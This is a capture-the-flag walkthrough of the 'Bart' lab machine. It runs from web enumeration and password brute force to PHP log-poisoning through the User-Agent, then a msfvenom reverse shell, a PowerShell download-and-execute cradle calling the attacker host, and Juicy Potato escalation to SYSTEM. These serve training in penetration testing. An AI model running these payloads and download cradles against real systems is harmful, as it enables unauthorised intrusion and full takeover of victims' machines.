# Bart
## Reconnaissance
### Initial Port Scan
```bash
sudo ./nmapAutomator.sh 10.10.10.81 All
```
* From the result, an open port 80 is discovered

![1](https://user-images.githubusercontent.com/53956303/132927977-bbcfc039-0f15-4a66-ab93-07ec04f695b4.png)
## Enumeration
## Port 80
* From the page, an web page for "Bart" is found

![2](https://user-images.githubusercontent.com/53956303/132928146-309c9de8-aaa3-426b-ad4c-527a81d02ecf.png)
* When access to `http://10.10.10.81`, the page redirects to "forum.bart.htb"
  * Add it to `/etc/hosts`
```bash
10.10.10.81    forum.bart.htb bart.htb
```
### Wfuzz to find subdomains
* Since there has too much result that has 0 word, search execpt them.
```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hw 0  -u http://10.10.10.81 -H "HOST: FUZZ.bart.htb"
```
* From the result, another subdomain `monitor` is found

![3](https://user-images.githubusercontent.com/53956303/132928501-14c50a4f-44a0-400b-a7ff-6b417b8eae7d.png)
* Add it to `/etc/hosts` too
```bash
10.10.10.81    forum.bart.htb bart.htb monitor.bart.htb
```
### Web Enumeration (forum.bart.htb)
![4](https://user-images.githubusercontent.com/53956303/132928613-5b3f340e-e873-4403-9920-a6a42a65cf12.png)
* From the page source, some possible usernames are found
  * `Samantha Brown`, `CEO@BART`, `Daniel Simmons`, `Robert Hilton (Head of IT)`, and `Harvey Potter (Developer)`
![5](https://user-images.githubusercontent.com/53956303/132928660-3835c0bf-f2f3-4b1d-86b3-55ab8cc4ed2d.png)
### Web Enumeration (monitor.bart.htb)
* from the page, a login page for "Server Monitor" is found

![6](https://user-images.githubusercontent.com/53956303/132928855-1cc1c512-7374-4d9c-82c9-2c41692e13d4.png)
* The application version also can be found
  * `PHP Server Monitor v3.2.1`

### Use "Forgot Password" function to identify the username
* When put `test` as a username, it returns this message

![7](https://user-images.githubusercontent.com/53956303/132928942-07d02e2a-f8a3-4fdf-a455-4b889f3a2b2e.png)
* It means that the existance of a username can be identified on this page

*  When put the `Harvey` as username from the list of possible usernames, the page returns an interesting result

![8](https://user-images.githubusercontent.com/53956303/132929000-05280ec7-f7fd-4882-9ae2-ed2eb7ca302d.png)
* It menas that `Harvery` user exist!

### Use Burp Suite to Brute Force Password
* Capture the login traffic and use intruder to brute force password
  * use `/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt` as the payload file

![9](https://user-images.githubusercontent.com/53956303/132929123-ce29c6c9-2195-4fea-99f4-a4327ef010bb.png)
* From the result, a password `potter` returns a different response length.
  * It might be the password for `Harvey` User
![11](https://user-images.githubusercontent.com/53956303/132929585-037a79c7-a42b-413b-ac65-5d4ede02d6ef.png)

### Login to `monitor.bart.htb`
* Using the credentials that obtained from the enumeration, access granted

![11](https://user-images.githubusercontent.com/53956303/132929660-841d788e-d0ef-4aee-aa35-1dadf4f56a2c.png)
### Enumerate a server on Server Monitor
* Inside the "Internal Chat", a new "Domain/IP" is found
  * `http://internal-01.bart.htb`

![12](https://user-images.githubusercontent.com/53956303/132929736-4526f5a4-0ac2-45f4-9ada-1b6e9c8b8a46.png)
* Add it to `/etc/hosts`
```bash
10.10.10.81    forum.bart.htb bart.htb monitor.bart.htb internal-01.bart.htb
```

### Enumerate Web page (internal-01.bar.htb)
![13](https://user-images.githubusercontent.com/53956303/132929838-30f71d45-b7fc-4680-bc90-0f9afb8a7b9a.png)
* From the page, a Simple_chat login page is found

### Open Source Enumeration
* from [Simple_Chat](https://github.com/magkopian/php-ajax-simple-chat/tree/master/simple_chat), a `register_form.php` and `register.php` are found
  *  from teh `register.php`, it sends two parameteres in a POST request; `uname` and `passwd` (8 characters mininum)

![14](https://user-images.githubusercontent.com/53956303/132930796-4748aca9-a5a0-4b69-8c7f-b6a03f6f569f.png)
### Capture the Traffic Using Burp Suite to register a user
* Capture the Login taffic and change from `login.php` to `register.php`
  * From

![15](https://user-images.githubusercontent.com/53956303/132930861-ad2d15ea-a380-4c5b-bb95-e2bde7ff852e.png)
  * To

![16](https://user-images.githubusercontent.com/53956303/132930894-85d56569-af30-40ba-a581-302f52b2b09b.png)
* Then, forward the traffic and login as a newly crated user

![17](https://user-images.githubusercontent.com/53956303/132930927-5f4180f7-c915-494a-8221-014fc084711d.png)
### Enumerate log on internal-01.bart.htb
* When click the "log" on the to, it show a strange result

![18](https://user-images.githubusercontent.com/53956303/132930997-4206eb92-3b77-4da1-8754-3784add23e53.png)
### See the `/log/log.txt` file

![19](https://user-images.githubusercontent.com/53956303/132931034-8c07657e-d749-4bb0-8b9a-f7abf8f51490.png)
* It looks very similar to Apach PHP injection as User-Agent (on `/var/log/apache2/access.log`)
#### Put an php system command into User-Agent
```php
<? php system(whoami);?>
```
* It worked!

![8](https://user-images.githubusercontent.com/53956303/132932708-6f2fe8b7-878c-4317-b89d-461397e1c5a8.png)
## Initial Foothold
### Create a reverse shell using msfvenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f exe > shell.exe
```
### Transfer the malicious file
* Open a python http server
```bash
sudo python3 -m http.server 80
```
* Insert a command to download the file via Powershell
```bash
<?php echo exec("powershell -command \"(New-object SYstem.Net.WebClient).DownloadFile('http://10.10.14.29/shell.exe', 'shell.exe')\""); ?>
```
![9](https://user-images.githubusercontent.com/53956303/132932720-7340453b-b066-4707-b6ef-8e5ec3b6c64a.png)
### Start a handler and execute the file
* Start a handler
```bash
sudo msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.29
set LPORT 4444
run
```
* Execute the file
	* Insert it into Burp Suite
```bash
<?php echo exec('shell.exe'); ?>
```
* As a result, a meterpreter shell as "nt authority\iuser" is open
## Privilege Escalation
### See the privileges
```bash
whoami /priv
```
* As a result, SeImpersonatePrivilege is enabled
### Run Windows-exploit-suggester.py
* From the reuslt, a Potato attack may works for this machine

![10](https://user-images.githubusercontent.com/53956303/132932734-6fda7968-da44-43d9-bc9e-b37e44458919.png)
### Use Juicy Potato
#### Preparation
**1. Modify Invoke-PowerShellTCP.ps1 to get a reverse shell back**
```bash
cp ~/Desktop/tools/nishang/Shell/Invoke-PowerShellTCP.ps1 .
mv Invoke-PowerShellTCP.ps1 shell.ps1
```
* Add this line at the bottom to get a reverse shell back
```bash
Invoke-PowerShellTCP -Reverse -IPAddress 10.10.14.29 -Port 1234
```
**2. Make a *Shell.bat* to download and execute *shell.ps1***
```bash
powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.29/shell.ps1')
```
**3. Transfer files to the target machine**
* Open a python http server
```bash
mv ~/Desktop/tools/JuicyPotato.exe .
sudo python3 -m http.server 80
```
* Download files on Target machine
```bash
certutil -urlcache -f http://10.10.14.29/shell.bat shell.bat
										 JuicyPotato.exe jp.exe
```
### Execute the Juicy Potato
* Start a netcat listener on Kali
```bash
sudo nc -lnvp 1234
```
#### Find a CLSID for an OS
|[juicy-potato/CLSID at master · ohpe/juicy-potato · GitHub](https://github.com/ohpe/juicy-potato/tree/master/CLSID)|
|----|
* Try CLSIDs until the exploit works
#### Execute the Juicy Potato
* -t: create process call. use * to test both options
* -p: the program to run. use shell.bat
* -l: COM server listen port. This can be anything.
* -c: CLSID for an OS
```bash
jp.exe -t * -p shell.bat -l 4444 -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
```
* As a result, a "nt authority/system" shell is open


